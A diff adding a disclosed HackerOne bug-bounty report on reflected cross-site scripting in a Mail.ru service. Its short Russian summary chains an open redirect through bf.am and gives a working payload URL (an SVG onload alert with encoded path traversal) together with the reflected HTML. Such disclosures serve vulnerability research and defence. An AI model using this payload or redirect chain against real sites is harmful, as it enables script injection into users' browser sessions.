@@ -1,0 +1,22 @@
+ReportLink:https://hackerone.com/reports/66422
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:06.10.2016 12:22:27
+
+Summary:
+
+Открыть с помощью Internet Explorer 
+(для формирования правильного запроса используется баг перенаправления, поэтому необходим сценарий "bf.am/x?r=")
+
+```
+http://bf.am/x?r=https://mrgs.mail.ru/"><svg/onload=alert(document.domain)>/%252e%252e/%252e%252e/
+```
+
+Результат:
+```
+<input type="hidden" name="target" value="/"><svg/onload=alert(document.domain)>/%2e%2e/%2e%2e/">
+```
